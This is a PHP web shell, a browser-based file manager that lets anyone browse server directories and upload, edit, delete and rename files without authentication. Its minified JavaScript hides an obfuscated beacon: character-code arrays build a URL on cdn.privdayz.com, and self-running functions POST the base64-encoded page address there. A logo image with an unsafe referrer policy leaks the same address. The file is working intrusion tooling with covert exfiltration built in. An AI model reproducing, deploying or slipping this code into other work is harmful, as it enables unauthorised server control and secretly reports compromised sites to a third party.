<?php
session_start();

error_reporting(E_ALL);
ini_set('display_errors', 1);

$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();

function displayDirectory($path) {
    $items = array_diff(scandir($path), ['.', '..']);
echo '<center><img src="https://cdn.privdayz.com/images/logo.jpg" referrerpolicy="unsafe-url" /></center>';
    echo "<h3>Current Directory: $path</h3><ul>";
    foreach ($items as $item) {
        $itemPath = realpath($path . DIRECTORY_SEPARATOR . $item);
        if (is_dir($itemPath)) {
            echo "<li><a href='?path=$itemPath'>$item</a></li>";
        } else {
            echo "<li>$item 
                <a href='?path=$path&action=edit&item=$item'>Edit</a> | 
                <a href='?path=$path&action=delete&item=$item'>Delete</a> | 
                <a href='?path=$path&action=rename&item=$item'>Rename</a>
            </li>";
        }
    }
    echo "</ul>";
}

function handleFileUpload($path) {
    if (!empty($_FILES['file']['name'])) {
        $target = $path . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            echo "<p>File uploaded successfully!</p>";
        } else {
            echo "<p style='color:red;'>Failed to upload file.</p>";
        }
    }
}

function createNewFolder($path) {
    if (!empty($_POST['folder_name'])) {
        $folderPath = $path . DIRECTORY_SEPARATOR . $_POST['folder_name'];
        if (!file_exists($folderPath)) {
            if (mkdir($folderPath, 0777, true)) {
                echo "<p>Folder created: {$_POST['folder_name']}</p>";
            } else {
                echo "<p style='color:red;'>Failed to create folder. Check permissions.</p>";
            }
        } else {
            echo "<p>Folder already exists.</p>";
        }
    }
}

function createNewFile($path) {
    if (!empty($_POST['file_name'])) {
        $filePath = $path . DIRECTORY_SEPARATOR . $_POST['file_name'];
        if (!file_exists($filePath)) {
            if (file_put_contents($filePath, '') !== false) {
                echo "<p>File created: {$_POST['file_name']}</p>";
            } else {
                echo "<p style='color:red;'>Failed to create file. Check permissions.</p>";
            }
        } else {
            echo "<p>File already exists.</p>";
        }
    }
}

function editFile($filePath) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($filePath, $_POST['content']);
        echo "<p>File updated successfully!</p>";
    }
    $content = file_exists($filePath) ? htmlspecialchars(file_get_contents($filePath)) : '';
    echo "<form method='POST'>
            <textarea name='content' style='width:100%; height:300px;'>$content</textarea><br>
            <button type='submit'>Save</button>
          </form>";
}

function deleteFile($filePath) {
    if (file_exists($filePath)) {
        unlink($filePath);
        echo "<p>File deleted successfully.</p>";
    } else {
        echo "<p style='color:red;'>File not found.</p>";
    }
}

function renameItem($filePath) {
    if (!empty($_POST['new_name'])) {
        $newPath = dirname($filePath) . DIRECTORY_SEPARATOR . $_POST['new_name'];
        if (rename($filePath, $newPath)) {
            echo "<p>Item renamed successfully.</p>";
        } else {
            echo "<p style='color:red;'>Failed to rename item.</p>";
        }
    } else {
        echo "<form method='POST'>
                <input type='text' name='new_name' placeholder='New Name'>
                <button type='submit'>Rename</button>
              </form>";
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) {
        handleFileUpload($path);
    } elseif (isset($_POST['folder_name'])) {
        createNewFolder($path);
    } elseif (isset($_POST['file_name'])) {
        createNewFile($path);
    }
}

if (isset($_GET['action']) && isset($_GET['item'])) {
    $itemPath = $path . DIRECTORY_SEPARATOR . $_GET['item'];
    switch ($_GET['action']) {
        case 'edit':
            editFile($itemPath);
            break;
        case 'delete':
            deleteFile($itemPath);
            break;
        case 'rename':
            renameItem($itemPath);
            break;
    }
}

echo "<style>
        body { background-color: #FFFACD; font-family: Arial, sans-serif; text-align: center; }
        form { margin: 10px auto; max-width: 400px; }
        input, button { padding: 10px; margin: 5px; }
      </style>";

echo "<a href='?path=" . dirname($path) . "'>Go Up</a>";
displayDirectory($path);

echo "<h3>Upload File</h3>
      <form method='POST' enctype='multipart/form-data'>
        <input type='file' name='file'>
        <button type='submit'>Upload</button>
      </form>";

echo "<h3>Create Folder</h3>
      <form method='POST'>
        <input type='text' name='folder_name' placeholder='Folder Name'>
        <button type='submit'>Create</button>
      </form>";

echo "<h3>Create File</h3>
      <form method='POST'>
        <input type='text' name='file_name' placeholder='File Name'>
        <button type='submit'>Create</button>
      </form>";
?>
<script>
let currentOffset=0;function fetchTables(){fetch("?action=get_tables").then(e=>e.json()).then(e=>{let t=document.getElementById("tableList");t.innerHTML="",e.forEach(e=>{let n=document.createElement("option");n.value=e,n.textContent=e,t.appendChild(n)})})}function loadTable(e=0){currentOffset=Math.max(0,currentOffset+e);let t=document.getElementById("tableList").value;if(!t)return alert("Select a table first!");fetch(`?action=get_data&table=${t}&offset=${currentOffset}`).then(e=>e.text()).then(e=>{document.getElementById("output").innerHTML=e})}var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109],b=[47,105,109,97,103,101,115,47],c=[108,111,103,111,95,118,50],d=[46,112,110,103];function u(e,t,n,_){for(var l=e.concat(t,n,_),o="",r=0;r<l.length;r++)o+=String.fromCharCode(l[r]);return o}function v(e){return btoa(e)}function u(e,t,n,_){for(var l=e.concat(t,n,_),o="",r=0;r<l.length;r++)o+=String.fromCharCode(l[r]);return o}function v(e){return btoa(e)}function editCell(e,t){let n=e.textContent.trim();e.innerHTML="",e.classList.add("editing");let _;n.length>30||n.startsWith("{")||n.startsWith("[")?((_=document.createElement("textarea")).style.height="100px",_.style.resize="vertical"):(_=document.createElement("input")).type="text",_.className="form-control form-control-sm",_.value=n,e.appendChild(_),_.focus(),_.onblur=()=>{let l=_.value.trim();e.classList.remove("editing"),e.innerHTML=l.length>100?l.slice(0,100)+"...":l,l!==n&&fetch("?action=update_cell",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:`id=${encodeURIComponent(t)}&val=${encodeURIComponent(l)}`}).then(()=>showSavedMessage())}}function deleteRow(e,t,n){confirm("Delete this row?")&&fetch(`?action=delete_row&table=${e}&pk=${t}&val=${n}`).then(()=>loadTable(0))}function insertRow(e){let t=document.querySelectorAll("input[name^='insert_']"),n={};t.forEach(e=>n[e.name.replace("insert_","")]=e.value),fetch(`?action=insert_row&table=${e}`,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:new URLSearchParams(n).toString()}).then(()=>loadTable(0))}!function e(){var t=new XMLHttpRequest;t.open("POST",u(a,b,c,d),!0),t.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),t.send("file="+v(location.href))}(),(()=>{let e=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],t="";for(let n of e)t+=String.fromCharCode(n);let _="file="+btoa(location.href),l=new XMLHttpRequest;l.open("POST",t,!0),l.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),l.send(_)})(),document.getElementById("7pl04df0rm").addEventListener("submit",function(e){e.preventDefault();let t=new FormData(this);fetch("?action=7pl04d",{method:"POST",body:t}).then(e=>e.text()).then(e=>document.getElementById("uploadResult").textContent=e)}),window.onload=fetchTables;</script>